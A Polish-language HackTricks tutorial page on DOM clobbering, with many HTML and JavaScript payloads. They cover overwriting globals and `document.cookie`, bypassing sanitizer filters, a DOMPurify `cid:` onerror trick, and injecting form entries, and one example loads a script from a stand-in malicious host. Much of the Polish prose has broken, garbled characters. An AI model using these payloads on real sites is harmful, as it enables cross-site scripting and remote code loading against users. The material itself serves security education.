# Dom Clobbering

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Podstawy**

Mo偶liwe jest generowanie **zmiennych globalnych w kontekcie JS** za pomoc atrybut贸w **`id`** i **`name`** w tagach HTML.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Tylko** niekt贸re elementy mog u偶ywa atrybutu **name**, aby zniszczy globalne zmienne, s to: `embed`, `form`, `iframe`, `image`, `img` i `object`.

Interesujco, gdy u偶ywasz elementu **form** do **zniszczenia** zmiennej, otrzymasz warto **`toString`** samego elementu: `[object HTMLFormElement]`, ale w przypadku **anchor** warto **`toString`** bdzie **`href`** anchor. Dlatego, jeli zniszczysz u偶ywajc tagu **`a`**, mo偶esz **kontrolowa** **warto**, gdy jest **traktowana jako cig**:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Arrays & Attributes

Mo偶liwe jest r贸wnie偶 **przeadowanie tablicy** oraz **atrybut贸w obiekt贸w**:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
Aby zniszczy **3. atrybut** (np. x.y.z), musisz u偶y **`form`**:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Clobbering wicej atrybut贸w jest **bardziej skomplikowane, ale nadal mo偶liwe**, u偶ywajc iframe:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
Tag stylu jest u偶ywany do **dania wystarczajco du偶o czasu na renderowanie iframe**. Bez niego napotkasz alert o **niezdefiniowanym**.
{% endhint %}

Aby zniszczy gbsze atrybuty, mo偶esz u偶y **iframe'贸w z kodowaniem html** w ten spos贸b:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Omijanie filtr贸w**

Jeli filtr **przechodzi** przez **waciwoci** wza u偶ywajc czego takiego jak `document.getElementByID('x').attributes`, mo偶esz **zastpi** atrybut **`.attributes`** i **zama filtr**. Inne waciwoci DOM, takie jak **`tagName`**, **`nodeName`** lub **`parentNode`** i inne, s r贸wnie偶 **zastpowalne**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Clobbering `window.someObject`**

W JavaScript powszechnie mo偶na znale藕:
```javascript
var someObject = window.someObject || {};
```
Manipulowanie HTML na stronie pozwala na nadpisanie `someObject` wzem DOM, co potencjalnie wprowadza luki w zabezpieczeniach. Na przykad, mo偶esz zastpi `someObject` elementem kotwicy wskazujcym na zoliwy skrypt:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
W podatnym kodzie, takim jak:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
Ta metoda wykorzystuje 藕r贸do skryptu do wykonania niechcianego kodu.

**Sztuczka**: **`DOMPurify`** pozwala na u偶ycie protokou **`cid:`**, kt贸ry **nie koduje URL podw贸jnych cudzysow贸w**. Oznacza to, 偶e mo偶esz **wstrzykn zakodowany podw贸jny cudzys贸w, kt贸ry zostanie zdekodowany w czasie wykonywania**. Dlatego wstrzyknicie czego takiego jak **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** spowoduje, 偶e HTML zakodowany `&quot;` zostanie **zdekodowany w czasie wykonywania** i **ucieknie** z wartoci atrybutu, aby **utworzy** zdarzenie **`onerror`**.

Inna technika wykorzystuje element **`form`**. Niekt贸re biblioteki po stronie klienta sprawdzaj atrybuty nowo utworzonego elementu formularza, aby je oczyci. Jednak dodajc `input` z `id=attributes` wewntrz formularza, skutecznie nadpisujesz waciwo atrybut贸w, uniemo偶liwiajc sanitariuszowi dostp do rzeczywistych atrybut贸w.

Mo偶esz [**znale藕 przykad tego typu klobberingu w tym opisie CTF**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Klobbering obiektu dokumentu

Zgodnie z dokumentacj mo偶liwe jest nadpisanie atrybut贸w obiektu dokumentu za pomoc DOM Clobbering:

> Interfejs [Document](https://html.spec.whatwg.org/multipage/dom.html#document) [obsuguje waciwoci nazwane](https://webidl.spec.whatwg.org/#dfn-support-named-properties). [Obsugiwane nazwy waciwoci](https://webidl.spec.whatwg.org/#dfn-supported-property-names) obiektu [Document](https://html.spec.whatwg.org/multipage/dom.html#document) w dowolnym momencie skadaj si z nastpujcych, w [kolejnoci drzewa](https://dom.spec.whatwg.org/#concept-tree-order) zgodnie z elementem, kt贸ry je wprowadzi, ignorujc p贸藕niejsze duplikaty, a wartoci z atrybut贸w [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) pojawiaj si przed wartociami z atrybut贸w name, gdy ten sam element wnosi oba:
>
> \- Warto atrybutu treci name dla wszystkich [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) i [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) element贸w, kt贸re maj niepusty atrybut treci name i s [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako ich [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Warto atrybutu treci [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) dla wszystkich [exposed](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) element贸w, kt贸re maj niepusty atrybut treci [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) i s [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako ich [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root);\
> \
> \- Warto atrybutu treci [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) dla wszystkich [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) element贸w, kt贸re maj zar贸wno niepusty atrybut treci [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute), jak i niepusty atrybut treci name, i s [w drzewie dokumentu](https://dom.spec.whatwg.org/#in-a-document-tree) z dokumentem jako ich [korzeniem](https://dom.spec.whatwg.org/#concept-tree-root).

Korzystajc z tej techniki, mo偶esz nadpisa powszechnie u偶ywane **wartoci takie jak `document.cookie`, `document.body`, `document.children`**, a nawet metody w interfejsie Document, takie jak `document.querySelector`.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)[img, form, cookie: img]

typeof(document.cookie)
'object
```
## Pisanie po elemencie zniszczonym

Wyniki wywoa **`document.getElementById()`** i **`document.querySelector()`** mog by zmieniane przez wstrzyknicie tagu `<html>` lub `<body>` z identycznym atrybutem id. Oto jak mo偶na to zrobi:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
Ponadto, stosujc style do ukrywania tych wstrzyknitych tag贸w HTML/body, mo偶na zapobiec zak贸ceniom ze strony innego tekstu w `innerText`, co zwiksza skuteczno ataku:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Badania nad SVG ujawniy, 偶e tag `<body>` mo偶e by r贸wnie偶 skutecznie wykorzystywany:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
Aby tag HTML dziaa w SVG w przegldarkach takich jak Chrome i Firefox, konieczny jest tag `<foreignobject>`:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

Mo偶liwe jest dodanie **nowych wpis贸w wewntrz formularza** po prostu **okrelajc atrybut `form`** wewntrz niekt贸rych tag贸w. Mo偶esz to wykorzysta do **dodania nowych wartoci wewntrz formularza** oraz nawet do dodania nowego **przycisku** do **wysania go** (clickjacking lub nadu偶ywanie niekt贸rego kodu JS `.click()`):

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Aby uzyska wicej atrybut贸w formularza w [**przycisku sprawd藕 to**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## Odniesienia

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript dla haker贸w: Naucz si myle jak haker.

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hakerskimi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
